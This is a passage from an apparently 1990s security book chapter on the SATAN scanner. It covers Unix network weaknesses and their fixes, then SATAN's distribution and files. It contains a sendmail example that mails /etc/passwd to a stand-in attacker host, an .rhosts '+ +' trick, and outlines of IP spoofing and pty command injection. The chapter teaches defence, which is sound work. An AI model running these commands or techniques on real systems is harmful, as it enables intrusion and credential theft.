exploit the TCP port number sent in the opening of the rshd (remshd) protocol. It is
true that the start of the rshd protocol permits the client to specify a TCP port
number for remote errors (stderr) to be sent to; however, the TCP port is only on the
client system. Any hacker who wanted to send a potentially untraceable packet, by
specifying a reserved port number such as smtp or FTP, would first require root
access to the system to be able to send the initial rsh (remsh) protocol, because they
must originate from a reserved port and such ports can be obtained only by a root
user. The hacker would need to be root on the client system to use this attack, and
if the hacker was root, such an attack would not be necessary.
System accounts such as bin or daemon should not have functional shells. For example, here is
a passwd entry for the user adm:
adm:*:4:4::/usr/adm:/bin/sh
Even though the adm account appears to prevent a login, by having an * in the passwd field
(which can sometimes also indicate a shadow passwd entry), a remote user can still log in if an
.rhosts file exists in /usr/adm. If the shell indicated /bin/false, a remote user could not gain
access to this account, even if an .rhosts file existed.
Note that rshd (remshd) does not generate an entry into the utmp/wtmp files when merely
executing a remotely requested service. rlogind and telnetd invoke /bin/login, which logs
information into those auditing files. If the intruder has root access, the audit trails can be
edited; however, if the intruder does not have root access, these audit trails can help the system
administrator track down the hacker. The hacker could invoke rsh to the system and invoke
SATAN and the Internet Inferno 485
csh -i, which would offer the hacker a shell (but no pty/tty) but leave no traces in the utmp/
wtmp. By using tcp-wrapper, a system administrator can track such accesses, even though the
utmp/wtmp file does not store any information.
Trust-based mechanisms are dangerous. Firewalls should screen out the shell and login ports to
prevent Internet users from gaining direct access to these services. Firewall systems should
never permit .rhosts or hosts.equiv files to be used. Most rlogind and rshd (remshd) servers
permit command-line options (-l) in inetd.conf to prevent .rhosts or hosts.equiv files from
being accessed.
SATAN attempts to rsh (remsh) to the target system using a custom C program that directly
calls the rcmd() routine. It first tries as user bin and root. If access is permitted, SATAN
assumes that rshd (remshd) trusts the world and has a + in the hosts.equiv. SATAN tries the
guest user if the remote system is an SGI IRIX system, because SGI ships systems without
passwords for the guest user.
rexd
The rexd service enables a remote user to execute a command on the server, similar to rsh or
remsh but with the added feature that the local file system of a user is NFS-mounted on the
remote system, and local environment variables are exported to that remote system. The
remote system, by default, does no authentication other than confirming that the uid and gid
of the client requesting the service exists on the remote system (auth_unix).
The client system uses the on command to invoke the command on the remote rexd server.
The on command takes the current uid setting of the invoking user. A hacker can either su to a
uid that exists on the remote system, such as bin or daemon, or create a custom program that
does this automatically. SATAN uses a custom program called rex to do this.
The rexd can be invoked with an -r option to require that the client system be listed in
hosts.equiv. rexd is invoked from inetd, so the tcp-wrapper, or inetd.sec file, can be used to
filter out requests based on originating IP addresses. However, both of these security enhancements
are somewhat weak. rexd should never be available on hosts connected to the Internet.
SATAN checks with the portmap program to see if rexd is available and then uses rex to get
the /etc/motd as proof of access.
sendmail
The sendmail daemon runs on nearly all Unix hosts, listening on the smtp port and offering to
enter into an smtp transaction with any remote system. This is a requirement for standard
e-mail service. Combining this with the fact that sendmail runs set-uid root on most systems,
and the fact that sendmail is made up of thousands of lines of C code, has made sendmail the
source of many security holes. New ones are found quite frequently.
486 Part II: Gaining Access and Securing the Gateway
SATAN looks for older versions of sendmail by examining the output of the initial line from
the smtp connection. If the version corresponds to one before 8.6.10 (with some corresponding
vendor-specific version numbers), it reports a vulnerability.
SATAN includes examples of two sendmail holes: mailing to file and mailing to programs.
sendmail should not permit remote users to specify a file or a program: these should only be a
result of alias or .forward expansions on the system running sendmail.
For example, old versions of sendmail permitted a remote user to specify a recipient of /home/
bkelley/.rhosts. The data portion of the mail message would be appended to this file. If the
data portion contained + +, any remote user could rlogin to the system as bkelley.
For an example of program mailing, recent versions of sendmail permitted a sender to be a
program: during the smtp transaction, a mail from: ‘|/bin/mail bkelley@intruder.com < /etc/
passwd’ combined with a rcpt to: nosuchuser would result in a bounced e-mail message being
sent to the /bin/mail program command. This command would then mail the /etc/passwd file
to bkelley.
The sendmail syslog buffer problem was discussed earlier, as was the “newline in queue file R
lines” attack. Another attack found in 5.6 sendmail involved specifying two users in the rcpt
to: line, the second user being a program or file. If sendmail queued the file, the second user
would be written to a separate R line in the queue file and never be tested to see if it was a
program or file.
All the preceding attacks, and many more, have been documented in CERT advisories and
vendor patches. However, not all systems are vigilantly patched.
X Server
Many workstations run the X server while permitting unrestricted remote access by using
xhost +. This permits any remote system to gain control over the system, including reading
user keystrokes, reading anything that is sent to the screen, starting or stopping any application,
and taking control over the currently running session.
SATAN uses xhost to make this check. It could use the XOpenDisplay() call to see if the
remote display permitted the intruder system, and therefore anyone, to have access. However,
SATAN uses the xhost program to do this by first setting the DISPLAY variable to the target
system and then running xhost via DISPLAY=target.notreal.com:0.0 xhost. If the remote
system permits access to the intruder system, this command will work.
Instead of using the xhost mechanism, which depends on IP addresses for authentication, the
.Xauthority file and magic cookies can be used. A utility program called xauth extracts a magic
cookie from the X server. (The magic cookie is created either by xdm or the user at the
beginning of each session.) This magic cookie can be sent to client systems and merged with
the .Xauthority files by using the xauth merge command. Each access by the client system
includes the magic cookie that the X server uses to authenticate the client request.
SATAN and the Internet Inferno 487
The weakness in this approach is that any packet sniffer that captures the network transmission
of the magic cookie, which takes place without encryption, can use it to gain access. If the
client’s .Xauthority file is readable by an intruder, the intruder can find the magic cookie. Note
that the magic cookie approach now permits user authentication rather than xhost’s mere
system authentication. (Each user has his or her own .Xauthority file containing magic cookies
for accessible X servers.)
A new CIAC advisory indicates that the randomization scheme used to send the selection of
the magic cookie may be too predictable, weakening this form of defense. An improved
randomization algorithm is referenced in the advisory (Fisher, 1995).
Another weakness in X server systems involve xterms. If the xterm has an X resource definition
of xterm*allowSendEvents: True, then the X server can request the xterm to send information
about events such as keystrokes. This permits a remote intruder to capture the user’s typing.
The xterm can dynamically set this option through the xterm’s main options menu.
Note For complete details on X Windows security, see the paper by John Fisher at the
CIAC Web site (Fisher, 1995).
In general, if xhost access is permitted, the remote system names should be specified rather
than +. The .Xauthority mechanism should be used if at all possible.
SATAN Itself
Although SATAN can be run from the command line, SATAN was primarily meant to be run
interactively from a Web browser. When run interactively, SATAN runs a simple HTML
server, perl/html.pl, which processes URL requests sent from the Web browser. The HTML
server listens on a random port and requires a password to permit access to various URLs. This
password is a 32-bit md5 hash that is meant to be somewhat random and difficult to guess.
The goal of this design is to prevent unauthorized users from sending requests to the HTML
server. Because SATAN runs as root, compromising the HTML server could permit a hacker
to execute SATAN commands.
Because the SATAN HTML server runs on the same system as the browser, the URL is never
sent over a network. However, some Web browsers disclose the SATAN URL when outside
URLs are selected after running SATAN. With version 1.1 and up, SATAN prints a warning
when a browser includes such behavior.
In general, exit the Web browser after running SATAN and before trying to use the browser to
connect to other Web sites. An alternative is to use only a Web browser that can be configured
to prevent such behavior. Web browsers that permit remote Web sites to gather information
on previous URLs represent a security problem, because they contribute to information
leakage. Recent versions of Mosaic (2.6) do not transmit URL information.
488 Part II: Gaining Access and Securing the Gateway
With version 1.1 and up, SATAN rejects requests that originate on hosts other than the one
that SATAN is running on, based on source IP address. As usual, a hacker might use IP
spoofing to circumvent this restriction.
A Modem on a TCP Port
SATAN sends a standard modem AT command to each TCP port. If the port replies with
OK, it assumes that a modem is connected to that port.
An intruder who finds a modem directly connected to the TCP port of a remote system can
use it to directly dial out. Modems should never be directly connected to a TCP port, and
especially never to TCP ports that are directly connected to the Internet. If a modem is
required on a TCP port, a tcp-wrapper and/or S/Key authentication should be considered.
Other Network Vulnerabilities
Even though SATAN does not specifically investigate the following issues, they do present
some significant areas of concern for system security.
Passwords
Password selection is very important. The primary target of the first phase of a network attack,
which is the primary goal of a SATAN scan, is the password file, so that the hacker can run
Crack against it. Programs that force users to choose good passwords can help protect logins.
These programs can require passwords that are not in a dictionary or that contain a strange
assortment of numbers and non-alphabetic characters.
Tip A paper by Walter Belgers (Belgers, 1991) on choosing passwords is very useful
on this topic. It is available from ftp://ftp.win.tue.nl/pub/security/UNIXpassword-
security.txt.Z.
Several papers by Gene Spafford are available on this topic, from the COAST Web
page or FTP archive.
It is dangerous for a user to invoke standard telnet, rlogin, or FTP over the Internet. The user
types a password that is sent without encryption. One must assume that a hacker is packet
sniffing and watching for the unencrypted transmission of passwords, as is typical in FTP,
telnet, rlogin, and rexec. If a user does type the password over an Internet connection, it is
important that the user change the password as soon as possible once the user returns to a
connection within the organization’s firewall.
Users should change passwords often and consider using one-time passwords (S/Key, or Opie),
ssh, SSL applications, Kerberos (tickets), or smart cards. Using shadow passwords protects user
passwords from Crack attacks. Not putting them into ˜ftp/etc also protects user passwords
from Crack attacks.
SATAN and the Internet Inferno 489
Tip ftpd typically uses only the ˜ftp/etc/passwd file for mapping uids to login names, so
that the ls command prints an owner rather than a number. Some versions of ftpd,
notably wu-ftpd, permit sublogins, where a user first logs in anonymously, gets
placed into a chrooted environment of ˜ftp, then does a sublogin as that user. In
such situations, the ˜ftp/etc/passwd password field is used to permit the login. The
admin should require each user to choose a new password, clip the encrypted
version of that from the /etc/passwd field, put that in the ˜ftp/etc/passwd entry, and
then require the user to select a new and different password for the regular account.
If sublogins are not used, an * can be put into the password field of the ˜ftp/etc/
passwd file.
As an administrator, there is one way to deal with protecting the NIS passwd map: run NIS
only behind a firewall. The NIS server sends a passwd map in response to any request with the
appropriate domain name. Guessing the domain name can be done, and programs like ypx can
help to send maps.
Secure RPC and NIS+ can help to hide the password map, but the encryption strength has
been questioned. Export restrictions may prevent non-U.S. users from getting programs using
DES encryption. Finally, the administration of a system using Secure RPC or NIS+ is frequently
considered more difficult than regular NIS.
There are at least four ways to deal with protecting /etc/passwd:
n Shadow password files
n Password selection enforcers
n One-time passwords
n Electronic smart cards
Shadow password files store the encrypted password in a file that is accessible only to root; the
regular /etc/passwd file is world-readable. Combining this with a restriction on where root can
log in can make getting a copy of the encrypted passwords difficult.
Note On some Linux systems and HP-UX, the /etc/securetty lists those ttys that can be
used to log in as root. Only ttys that are physically under control, such as console,
or terminals connected to the serial ports, such as tty00 or tty01, should be listed.
For Sun and other systems, the /etc/ttytab file lists all ttys. Adding the word secure to
the option list at the end of an entry permits the entry, such as console, to be a
source for a root login. For other systems, /etc/login.defs or /etc/default/login file can
be used to do this. Study the login man page to find out details on your system.
490 Part II: Gaining Access and Securing the Gateway
Password-selection enforcement programs basically replace the standard Unix passwd program
with a version that tries to guess the proposed new password. Essentially, these programs run
something like Crack against the proposed new password before accepting it.
One-time passwords, using programs such as S/Key or Opie, require users to type a new
password at each login. Each user has a paper (or online) printout of passwords and is required
to generate new lists occasionally. Although this appears to be quite safe, an attack against the
predictability of the sequencing is the greatest threat, though the security of a printed (or
online) copy of the passwords is really the greater source of problems.
Another approach is to use smart cards, such as the SecurID from Security Dynamics, that
require a PIN number to be typed in and then send a password. This seems to offer safety
comparable to one-time passwords, without the threat of a printed list of passwords.
If the target system has an X Windows vulnerability, the intruder can gain access to all typed
keystrokes, effectively canceling many of the preceding password security approaches.
It is important that non-user accounts in /etc/passwd, such as tftp or bin, have an * in the
password field and reference /bin/false as the shell. This prevents hackers from gaining access
to these accounts.
ttys
Each xterm, telnetd, or rlogind invokes a pty/tty to interact with the user. The application
opens a pseudo-tty, or pty, which acts as the master and is associated with a slave tty. The
application then typically invokes a shell (xterm) or /bin/login (telnetd, rlogind) that invokes
a shell.
When the user types on the keyboard, the keystrokes are sent to the pty. If the user is typing
on a remote network connection, using rlogin or telnet, the rlogind or telnetd writes the
keystrokes to the master pty.
The pty is described by a device file, such as /dev/pty/ttys2. The permissions on this file are
determined by the mesg command. For example:
% ll ‘pty’
crw------ 1 bkelley users 17 0x000032 Nov 20 00:51 dev/pty/ttys2
% mesg
is n
% mesg y
% ll ‘pty’
crw--w--w- 1 bkelley users 17 0x000032 Nov 20 00:51 dev/pty/ttys2
% mesg n
% ll ‘pty’
crw------ 1 bkelley users 17 0x000032 Nov 20 00:51 dev/pty/ttys2
%
SATAN and the Internet Inferno 491
The mesg command enables the user to permit other users to invoke the talk or write command
to send messages or interactively talk to this user. A remote user can indicate talk
root@m2.notreal.com and send messages to that user if mesg y has been set by root on
m2.notreal.com.
The problem is that it is possible to cause commands to be executed on ptys. For example, by
echoing commands directly onto the pty device and embedding termcap sequences to invoke
those commands, a user can cause commands to be executed by the owner of that pty device. If
that owner is root, the user can gain access to root using this technique.
In general, users should be wary of leaving a pty world-writeable. The global /etc/profile (or
/etc/cshrc) should use a default of mesg n so that users are required to specifically indicate this
service.
Rwall (an rpc service available through portmap) and the talk network service (517/UDP,
518/UDP) permit a remote user to send messages to many remote systems, but these commands
merely print to the screen. Unless the termcap capabilities of the remote terms permit
the ability to embed execution strings, there is no way to gain access remotely.
RIP Updates
A Unix system can maintain routing tables, either for optimized local routing or to act as a
router, by running the gated program. gated can support many routing protocols, from
DVMRP to OSPF, but most gated implementations use RIP, which is also supported by many
hardware routers. If the gated program does not filter routing updates by source address, a
hacker can modify the routing tables on the target system. This could lead to disruption of
service and facilitate other attacks.
In gated versions 1.x, the gated.conf file can be modified to listen only to certain sources for
routing information by adding a line such as this:
trustedripgateways gateway [ gateway ] ... trustedhellogateways gateway [ gateway ]
Only the routing updates from the indicated RIP or HELLO gateways are recognized as valid.
In gated versions 2.x and 3.x, the gated.conf file can include a trustedgateways clause to specify
the same access controls for RIP, HELLO, and ICMP redirects.
RIP-2 packets can use a password authentication. The password consists of a quoted string, 0
to 16 bytes long. OSPF can also use an authentication key, which consists of 1 to 8 octets. A
hacker with a packet sniffer could gain access to these passwords and spoof a routing packet.
EGP and BGP require explicit listings of peers in the configuration file. Once again, IP
spoofing by a hacker could be used to insert false routing updates.
gated broadcasts RIP routes that could provide a hacker with routing information even if the
hacker is unable to make modifications to the system.
492 Part II: Gaining Access and Securing the Gateway
DNS Searchlists
By default, a hostname lookup using the DNS resolver proceeds by appending the current
domain to the hostname and attempting a lookup. On failure, the resolver removes the
leftmost part of the current domain and retries.
RFC 1535 discusses vulnerabilities to this algorithm. Here is an example that illustrates the
vulnerability:
% head -1 /etc/resolv.conf
domain mftg.notreal.com
% nslookup inv.mftg.notreal
At this point, the resolver first tries to look up this line:
mftg.notreal.com.mftg.notreal.com
This fails. Next, the resolver tries this:
mftg.notreal.com.notreal.com
This also fails. At this point, the resolver sees that only two parts remain to the domain part,
and it quits, causing the nslookup to fail.
A hacker within the NotReal company could apply for the domain com.notreal.com, perhaps
claiming that the domain oversaw the communications department. If the hacker owned the
name server for this domain, the hacker could respond to the second resolver request. At this
point, the hacker could start feeding false information to the resolver, perhaps permitting trustbased
attacks using .rhosts to succeed.
The appropriate way to solve this problem is by explicitly listing a search list in the resolv.conf
file to specify the exact domain search algorithm.
Investigating IP Spoofing
Although SATAN does not specifically investigate IP spoofing, its scans for vulnerabilities
involving remote shell access and other services that can be exploited using IP spoofing as the
next logical step.
Overview
The Internet is based on version 4 of IP. This version of IP does not include any provision for
source authentication. If a version 4 IP packet arrives at a network destination, the upper layers
of the network stack must be invoked to perform authentication.
Many applications are designed to trust a packet based on the IP address of the sender. These
applications believe that if the packet was able to route itself to this destination, and reply
packets are able to route themselves back to the source, the IP address of the source must be
SATAN and the Internet Inferno 493
valid. (This is assuming that IP source routing is turned off.) These applications, if using TCP
above IP, further believe that if the remote sender is able to continue a conversation on the
TCP level, the connection is valid. Both of these assumptions are dangerous.
Exploiting It
In early 1995, CERT released an advisory on IP spoofing that addressed the following two
problems:
n Routers were permitting spoofed IP packets to cross over firewalls.
n Spoofed IP packets were exploiting rshd/remshd by predicting TCP sequence numbers.
The first problem was caused by router misconfigurations. A router that connects an internal
network to the Internet has at least two network ports. Imagine a router that had four ports,
one of which is connected to the Internet. If a packet arrives from an internal IP address and is
destined for another internal IP address, the router sends it to the correct destination port. If
the packet arrives from the Internet, source restrictions prevent it from going to the internal
network. For example, the firewall does not allow an external user to invoke the rsh/remsh
service on an internal system by screening all requests to the shell TCP port originating from
an external address.
Some routers, however, did not keep information on the port source of the IP packet. All the
IP packets from all the ports were loaded into a single queue and then processed. If the packet
indicated an IP source address from an internal network, that packet was approved for
forwarding. Therefore, an external user just had to indicate an internal IP address to send the
packet across the router.
By itself, this problem might be perceived to lead only to single packet attacks. The intruder
would find it difficult to carry on a TCP connection because the internal host would be
sending reply TCP packets to the internal address specified by the intruder’s fake packet. The
intruder would not be able to acknowledge these packets because the intruder would not know
what sequence number was in the packet.
This is when the second problem added to the vulnerability. The intruder used a TCPoriented
service, such as FTP, that was permitted to cross the router. The intruder connected
to the target system and then disconnected. The hacker used the knowledge of the TCP
sequencing algorithm to predict the sequence number of the packet that would be sent in
response to the subsequent incoming TCP connection request. The hacker then sent the
appropriate TCP connection request to the login or shell port. At this point, the target system
responded to the SYN packet with a SYN ACK packet that was sent to the real internal host
corresponding to the address the intruder indicated. The external system, however, has flooded
this internal host with initialization packets, causing its response time to slow down drastically.
As a result, this internal host does not send a RST but instead disregards the packet, and the
external hacker blindly sent an ACK with the predicted sequence number to the target system.
494 Part II: Gaining Access and Securing the Gateway
The target system assumed that the ACK that arrived originated from the internal host because
it carried the correct ACK number and IP address. At this point, the intruder could send the
normal data packets for the login or shell protocol, beginning attacks on these services.
Any service that relies on IP authentication is vulnerable to the attack described here. However,
other attacks that exploit IP address authentication are also possible.
The rlogind and remshd servers approve access based on a hostname that is sent in the
protocol. This hostname, which should match an entry in .rhosts or /etc/hosts.equiv, is
specified by the client. Until a few years ago, no additional verification was made by the
servers. Now, most servers take the IP address of the incoming connection and do a reverse
lookup using the resolver getnamebyaddr() call.
This call attempts to contact the DNS server and find the name corresponding to the IP
address. If these match, access is granted. If the DNS server exists outside the administrative
domain of the user, verification of the identity of the client is not certain. The DNS server
could have a contaminated cache containing faulty PTR records that point to the hacker’s own
name server. The DNS server could be administered by the hacker and therefore provide
untrusted information.
The ftpd server bounce problem, discussed earlier, also permits users to hide the true IP source
of the connection by actually using the IP address of the system running the ftpd for the source
of TCP connection. This vulnerability simplifies routing problems for the hacker.
If the intermediate systems between the hacker and the target system permit source routing,
fake IP addresses are even easier to implement. The intruder can specify the route in the
options field of the IP packet.
inetd, tcp-wrapper, and xinetd all approve access for services by examining the IP address of
the incoming request and comparing it to an access list. The secure portmap and rpcbind
programs also defer authorization to IP addresses. The rpc.mountd program uses the IP
address to control access to file handles if an exported file system specifies a limited access list.
The list of network services that depend on IP addresses for some sort of authorization is quite
large. When the fact that IP spoofing is possible is combined with the list of available services,
the number of network vulnerabilities becomes large.
Note For a more detailed look at IP spoofing, see Chapter 6.
Protection
Some sort of encrypted authentication scheme would provide the best form of protection to
this vulnerability. However, this is not possible within the framework of the IP level.
SATAN and the Internet Inferno 495
For the router TCP connection attack, the only protection from permitting an unauthorized
new TCP connection as indicated earlier is randomization of the sequencing numbers between
subsequent TCP connections. This prevents the hacker from guessing the sequence number of
the SYN ACK packet and responding with an ACK. It does not completely eliminate the
possibility that the hacker could guess the sequence number, because the value has a 32-bit
range; however, it makes it much more difficult.
A paper by Bellovin (Bellovin, 1993) discusses the exact details of the randomization schemes.
This does not provide protection over hijacked connections. If an intruder is able to monitor
connections, that intruder could insert packets. Imagine that a user used telnet to connect to
the notreal.com system. Even if the telnet used some sort of encrypted authentication with
Kerberos, if the data connection took place without encryption, the intruder could insert
packets into the data stream, effectively capturing control of the user’s keyboard. Only packetlevel
authentication could avoid this problem.
The other solution is higher-layer authentication, using some sort of security environment
such as Kerberos, SSL, or ssh. These protocols do not rely on the IP address for source
authentication.
The ftpd server bounce problem is fixed in vendor patches or by getting the latest wu-ftpd
program. All Unix kernels can be modified to reject source routed packets. The kernels can
also be modified to prevent the automatic forwarding of IP packets that arrive at the network
port but are destined for other systems. Such packets are effectively trying to use the system as
a router.
Another IP problem exists with regard to fragmented packets whose fragmentation boundaries
lie within TCP packet headers. RFC 1858 addresses ways to deal with vulnerabilities that
relate to this problem.
A Long-Term Solution
The newest standard for IP, version 6, includes support for packet-level authentication.
Unfortunately, the Internet has yet to offer the infrastructure to support version 6 applications.
Broad support from router manufacturers and Unix kernel vendors is required before applications
using v6 will become available and popular. In the opinion of this author, end users will
not be able to consider IP v6 applications as a viable solution for security issues until about the
year 2001 (five years from this writing).
Examining Structural Internet Problems
Unfortunately, some Internet vulnerabilities are quite difficult to fix: they involve a fundamental
change in the way the Internet operates, requiring modifications that could be unacceptable
to the expected functionality of Internet applications.
496 Part II: Gaining Access and Securing the Gateway
DNS Cache Corruption
The problems with DNS are inherent in the design of a distributed database: by delegating
responsibility to remote sites, the integrity of the information on those remote sites is uncertain.
Added to this problem is the need for caching to improve the performance of the
distributed database.
As indicated in previous sections, the cache of a name server can be corrupted to include
erroneous resource records, such as fake PTR entries. Such cache corruption can be used to
attack rlogind and rshd/remshd. SATAN does a scan for remote shell services: DNS cache
corruption is one of the primary ways used to exploit this problem.
The cache corruption can take place by adding extra resource records to replies destined for a
name server. A paper by C. Schuba and E. Spafford (Schuba & Spafford, 1993) shows how a
hacker can cause the name server to request a reply, which can contain the additional resource
records. The paper calls this the “Me Too” attack. Another paper by Bellovin (Bellovin, 1993)
also addresses this topic. If SATAN would implement the fourth level of scan, “All Out,” it is
highly likely that a DNS cache corruption attack would be included.
The protection against this attack would be to turn off caching on name servers. However,
the resulting performance drop on the DNS infrastructure would virtually eliminate its
usefulness—a major setback to the performance and usefulness of the Internet.
The proper approach to solving this problem is to use some sort of cryptographic authentication,
although this too would create a performance drop.
Sniffers
A packet sniffer is a program that runs on a system and captures every network packet that
travels past the network interface, even if it is not destined for this system or originated on this
system.
Packet sniffers can easily be installed on most Unix systems to watch traffic crossing the
network interface. Recent sniffer attacks on the Internet have resulted in the disclosure of
hundreds of thousands of passwords, because many network protocols transmit the passwords
in clear text.
Weak Encryption
Although SATAN does not specifically investigate this problem, SATAN does search for the
presence of https (tcp/443), which is an SSL version of http. Once the presence of this
application is known, packet sniffing can record packets destined for this port. These packets
typically contain important financial information (credit card numbers) and may be weakly
encrypted. SATAN is useful for a hacker whose goal is to locate active https ports on the
Internet.
SATAN and the Internet Inferno 497
The assumption that the strength of a cryptographic algorithm is directly related to the key size
is not always accurate. All cryptographic schemes use some sort of session key that is generated
based on a random number seed. No computer algorithm can easily generate a truly random
number. Predictability of the random number seed can decrease the effective bit size of session
keys.
A recent Netscape browser ran into this problem. Netscape depends on SSL and permits up to
a 128-bit session key to be used for encryption. The session key is generated by the client, in
this case a Netscape browser running on an MS Windows PC, and sent to the server, in this
case a Unix httpd. The PC offers limited facilities for generating a random number: the clock
offers marginal granularity, and other variables provide little additional randomization. The
result was that the randomness of the seed provided perhaps 16 to 32 bits of variability for the
generation of the session key. Such a limited key space could be quickly searched, resulting in
key disclosures in minutes rather than years, as had been assumed.
RFC 1750 addresses the security considerations of randomization and provides recommendations
to the producers of cryptographic algorithms.
It is important to clearly examine the true key size of an algorithm. For example, although
some U.S. government agencies claim that DES uses a 64-bit key, the eighth bit of every 8
bytes is masked inside the algorithm, making the effective key size only 56 bits. One might
wonder about the effective key size of the skipjack algorithm, used in the Clipper chip and not
released to the public: the same government agencies that make the 64-bit claim for DES also
make an 80-bit claim for skipjack.
Binary Integrity
It is important to verify the integrity of any binary program that you run on your system. The
binary program could be corrupted on the remote system with some sort of virus, or the binary
could be modified during the file transfer to your system.
Source Integrity
Many FTP archives provide precompiled binary versions of application programs. Running
these programs can open your system to attack if trojan code is embedded in the binary.
Even those programs that provide source code might embed some difficult-to-understand
sections of code that effectively constitute a virus. Users should closely examine code before
compiling and running software of undetermined origin.
If the program is shipped on CD-ROMs or tapes, it is unlikely to have such problems.
However, if the source comes from a university FTP archive and no PGP signature is available,
the potential exists. Even md5 checksums that are distributed with the program are suspect:
the hacker could have modified these checksums and inserted them into the README file. A
PGP signature of each source file, or of a file containing md5 checksums, is the ideal way to
verify source integrity.
498 Part II: Gaining Access and Securing the Gateway
Transfer Modifications
A recent attack on programs distributed using FTP used the approach of modifying portions of
the files as they were transferred over the Internet. A fake TCP packet containing the modified
data was inserted into the connection by hackers who monitored the connection using packet
sniffers. The attack in question was used to modify the Netscape Navigator, a program that is
frequently downloaded using FTP. The modifications decreased the strength of the encryption,
permitting users to erroneously assume greater security for the transmission of secret
information, such as credit card numbers.
Once again, the distributor can generate a PGP signature for each source file. These PGP
signatures should be used to confirm the integrity of any file. Users should request that FTP
archives include .asc files containing PGP signatures for all distributions.
Denial of Service Attacks
SATAN reveals the presence of active network services such as ftpd, sendmail, or httpd. These
services are nearly always accessible to users “cruising” the Internet. As a result, these services
are open to “denial of service” attacks. It is quite difficult to avoid denial of service attacks. The
primary goal of such attacks is to slow down the target machine, fill up all available disk space,
and spam the mail recipients with vast amounts of useless mail or something similarly annoying.
Nothing prevents a user from sending millions of useless e-mail messages, each one small
enough to be accepted. Nothing prevents a remote user from initiating thousands of network
connections to the remote system. ftpd can limit the amount of disk space available to transfers,
and sendmail can limit the size of an individual e-mail message, but this won’t stop a
determined attacker. By partitioning the disk to limit the space available to each vulnerable
Internet service, the system’s exposure to such attacks is limited.
The best remedy is to use a firewall to limit the exposure of the majority of systems to random
Internet attacks. There is no way to avoid the e-mail attacks, because firewalls still need to
permit access from any remote user.
PostScript Files
It is possible to embed command sequences in PostScript files. When viewing the file, depending
on your viewer, the command sequences could be executed. The safest way to view
unknown .ps files is to print them out on a printer. That is the default action indicated in most
.mailcap files for MIME interpretation of .ps files. It would be possible to construct a filter to
prevent dangerous actions, or to modify the viewer to prevent dangerous actions, but such
tools and modifications are not widely available.
SATAN and the Internet Inferno 499
Rendezvous with SATAN
“‘Before we start to struggle out of here,
O master,’ I said when I was on my feet,
‘I wish you would explain some things to me.’”
—Dante Alighieri, Inferno, Canto XXXIV, lines 100–102
This section describes the SATAN program in great detail, with information on obtaining
SATAN, the files that make up SATAN, running SATAN, and extending SATAN to cover
new security holes.
Getting SATAN
The CD included with this book contains SATAN. It is also available from the following sites:
n ftp://ftp.mcs.anl.gov/pub/security
n ftp://coast.cs.purdue.edu/pub/tools/unix/satan
n ftp://vixen.cso.uiuc.edu/security/satan-1.1.1.tar.Z
n ftp://ftp.denet.dk/pub/security/tools/satan/satan-1.1.1.tar.Z
n http://ftp.luth.se/pub/unix/security/satan-1.1.1.tar.Z
n ftp://ftp.luth.se/pub/unix/security/satan-1.1.1.tar.Z
n ftp://ftp.dstc.edu.au:/pub/security/satan/satan-1.1.1.tar.Z
n ftp://ftp.acsu.buffalo.edu/pub/security/satan-1.1.1.tar.Z
n ftp://ftp.acsu.buffalo.edu/pub/security/satan-1.1.1.tar.gz
n ftp://ftp.net.ohio-state.edu/pub/security/satan/satan-1.1.1.tar.Z
n ftp://ftp.cerf.net/pub/software/unix/security/
n ftp://coombs.anu.edu.au/pub/security/satan/
n ftp://ftp.wi.leidenuniv.nl/pub/security
n ftp://ftp.cs.ruu.nl/pub/SECURITY/satan-1.1.1.tar.Z
n ftp://ftp.cert.dfn.de/pub/tools/net/satan/satan-1.1.1.tar.Z
n ftp://cnit.nsk.su/pub/unix/security/satan
500 Part II: Gaining Access and Securing the Gateway
n ftp://ftp.tcst.com/pub/security/satan-1.1.1.tar.Z
n ftp://ftp.orst.edu/pub/packages/satan/satan-1.1.1.tar.Z
n ftp://ciac.llnl.gov/pub/ciac/sectools/unix/satan/
n ftp://ftp.nvg.unit.no/pub/security/satan-1.1.1.tar.Z
n ftp://ftp.win.tue.nl/pub/security/satan-1.1.1.tar.Z
After you have ftped SATAN to your system, use uncompress satan-1.1.1.tar.Z (or
compress -d) and then tar xvf satan-1.1.1.tar to extract all the SATAN files.
At this point, the SATAN directory should look like this:
Changes TODO html/ perllib/ rules/ satan.ps
Makefile* bin/ include/ reconfig* satan src/
README config/ perl/ repent* satan.8
Examining the SATAN Files
A more detailed look at the files and directories included in the SATAN distribution provides
an insight into how SATAN works and how it can be extended.
The satan-1.1.1 Directory
The top-level directory contains the following programs:
n Makefile: Compiles the C programs in the src directory
n satan: The master SATAN program, written in PERL
n README: A one-page guide to getting SATAN running
n TODO: Wish list for future enhancements
n satan.8: A man page for the command-line version of SATAN
n satan.ps: A drawing of the SATAN character
n reconfig: Fixes pathnames using file.paths, PERL location
n repent: Changes all occurrences of SATAN to SANTA
n Changes: List of changes to SATAN program
Note that SATAN creates a satan-1.1.1/results directory to store the results. This directory is
only root searchable and readable.
SATAN and the Internet Inferno 501
The include Directory
The include directory is created only for Linux. Some distributions of Linux require the
44BSD /usr/include/netinet files to compile. SATAN creates the following two directories but
does not put any files into them. If the top-level make for Linux is unable to find ip.h, it
assumes that all the netinet files are missing and tells the user to put the netinet files from
44BSD into the following directory:
n include/netinet/
The rules Directory
The rules directory is critical to the functioning of SATAN. It includes the inference rules that
govern the future actions of SATAN, based on previous results, as well as making assumptions
based on information gathering. It includes the following files:
n rules/facts: Deduces new facts based on existing data
n rules/hosttype: Recognizes hosts based on banners
n rules/services: Classifies host by available services
n rules/todo: Specifies what rules to try next
n rules/trust: Classifies trust based on the database records
n rules/drop: Specifies which facts to ignore, such as NFS export cdroms
The config Directory
SATAN users need to customize the pathnames to system utilities in the appropriate files in
the config directory. In addition, the SATAN configuration file, satan.cf, is located here. This
configuration file controls the default behavior of SATAN, indicating the scan type, the
content of each scan, the proximity search variables, and timeouts.
This directory includes the following files:
n config/paths.pl: Path variables for PERL files
n config/paths.sh: Path variables for shell execution
n config/satan.cf: SATAN configuration file
n config/version.pl: SATAN version file
n config/services: An /etc/services file, just in case
502 Part II: Gaining Access and Securing the Gateway
The PERLlib Directory
The PERLlib directory includes two files from the PERL5.000 distribution that are sometimes
not included on all PERL5.000 FTP sites. Just in case, SATAN includes them in this directory.
It includes the following files:
n PERLlib/ctime.pl: Includes time functions
n PERLlib/getopts.pl: Gets command-line options
n PERLlib/README: Explains why these PERL files are included
The bin Directory
The bin directory contains the actual executables used by SATAN to investigate remote
systems. After the top-level make is executed, all the binaries resulting from builds in the src
directory are deposited into this directory. All the distributed .satan files are PERL scripts, and
